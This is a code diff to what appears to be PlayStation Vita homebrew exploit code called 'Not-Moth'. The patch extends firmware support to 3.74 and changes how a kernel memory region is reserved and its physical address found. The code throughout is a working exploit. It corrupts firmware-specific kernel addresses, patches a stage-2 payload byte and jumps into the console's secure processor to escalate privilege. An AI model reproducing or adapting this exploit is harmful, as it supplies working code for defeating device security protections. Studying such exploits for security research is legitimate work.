@@ -86,8 +86,11 @@ NMPcmd_0x50002_t NMPcargs;
 NMPSceSblSmCommPair NMPstop_res;
 static void *NMPcorridor = NULL, *NMPcached_sm = NULL;
 static volatile uint32_t NMPis_ussm_cached = 0;
-static volatile uint32_t NMPcorridor_paddr = 0x1C000000;
-static volatile uint32_t NMPcorridor_size = 0x1FE000;
+static volatile uint32_t NMPcorridor_size = 0xF0000;
+static volatile uint32_t NMPcorridor_paddr = 0;
+
+struct SceKernelAddrPair NMPvrange;
+struct SceKernelAddrPair NMPpairs[8];
 
 /*
 	Stage 2 payload for Not-Moth:
@@ -95,7 +98,7 @@ static volatile uint32_t NMPcorridor_size = 0x1FE000;
 	 - clean r0
 	 - jmp back to update_sm's 0xd0002
 	On 3.60 - 3.70 byte[14] = 0x26
-	On 3.71 - 3.73 byte[14] = 0x8c
+	On 3.71 - 3.74 byte[14] = 0x8c
 */
 unsigned char NMPstage2_payload[] = 
 {
@@ -120,7 +123,7 @@ unsigned char NMPstage2_payload[] =
 static int NMPconfigure_stage2(int fw) {
 	if (fw >= 0x03600000 && fw < 0x03710000) {
 		NMPstage2_payload[14] = 0x26;
-	} else if (fw >= 0x03710000 && fw < 0x03740000) {
+	} else if (fw >= 0x03710000 && fw < 0x03750000) {
 		NMPstage2_payload[14] = 0x8c;
 	} else
 		return 1;
@@ -137,15 +140,30 @@ static int NMPconfigure_stage2(int fw) {
 		- 0: ok
 		- 1: commem already reserved
 */
-static int NMPreserve_commem(int smset) {
+static int NMPreserve_commem(int smset, int usepaddr) {
+	int ret = 0;
 	if (NMPbuid != -1)
 		return 1;
+	
 	SceKernelAllocMemBlockKernelOpt optp;
 	optp.size = 0x58;
 	optp.attr = 2;
 	optp.paddr = NMPcorridor_paddr;
-	NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, NMPcorridor_size, &optp);
+	NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, NMPcorridor_size, (usepaddr == 1) ? &optp : NULL);
 	ksceKernelGetMemBlockBase(NMPbuid, (void**)&NMPcorridor);
+	if (usepaddr == 0) {
+		SceKernelPaddrList paddr_list;
+		NMPvrange.addr = (uint32_t)NMPcorridor;
+		NMPvrange.length = NMPcorridor_size;
+		paddr_list.size = 0x14;
+		paddr_list.list = &NMPpairs[0];
+		paddr_list.list_size = 8;
+		ret = ksceKernelGetPaddrList(&NMPvrange, &paddr_list);
+		if (ret < 0)
+			return 2;
+		NMPcorridor_paddr = NMPpairs[0].addr;
+	}
+	
 	if (smset == 1)
 		memset(NMPcorridor, 0, NMPcorridor_size);
 	return 0;
@@ -163,10 +181,10 @@ static int NMPreserve_commem(int smset) {
 static int NMPfree_commem(int smset) {
 	if (NMPbuid == -1)
 		return 1;
-	NMPbuid = -1;
 	if (smset == 1)
 		memset(NMPcorridor, 0, NMPcorridor_size);
 	ksceKernelFreeMemBlock(NMPbuid);
+	NMPbuid = -1;
 	return 0;
 }
 
@@ -300,7 +318,7 @@ static int NMPexploit_init(int fw) {
 	if (ret == 0) {
 		if (fw >= 0x03600000 && fw < 0x03710000) {
 			NMPCORRUPT_RANGE(0x0080bd10, 0x0080bd20);
-		} else if (fw >= 0x03710000 && fw < 0x03740000) {
+		} else if (fw >= 0x03710000 && fw < 0x03750000) {
 			NMPcorrupt(0x0080bd7c);
 		} else
 			return 3;
@@ -324,7 +342,7 @@ static int NMPf00d_jump(uint32_t paddr, int fw) {
 	uint32_t jpaddr = paddr;
 	int ret = -1, sm_ret = -1;
 	uint32_t req[16];
-	if (fw >= 0x03710000 && fw < 0x03740000) {
+	if (fw >= 0x03710000 && fw < 0x03750000) {
     	int xsm_ret = -1;
 		memset(&NMPcpybuf, 0, sizeof(NMPcpybuf));
 		NMPcpybuf[0] = 1;
@@ -362,7 +380,7 @@ static int NMPf00d_jump(uint32_t paddr, int fw) {
 */
 static int NMPrun_default(void *pbuf, uint32_t psz) {
 	int ret = 0;
-	int sysroot = ksceKernelGetSysbase();
+	int sysroot = ksceSysrootGetSysbase();
 	uint32_t fw = *(uint32_t *)(*(int *)(sysroot + 0x6c) + 4);
 	NMPctx = -1;
 	ret = NMPexploit_init(fw);
@@ -371,7 +389,7 @@ static int NMPrun_default(void *pbuf, uint32_t psz) {
 	ret = NMPconfigure_stage2(fw);
 	if (ret != 0)
 		return (0x60 + ret);
-	ret = NMPreserve_commem(1);
+	ret = NMPreserve_commem(1, 1);
 	if (ret != 0)
 		return (0x10 + ret);
 	ret = NMPcopy(&NMPstage2_payload, 0, sizeof(NMPstage2_payload), 0);
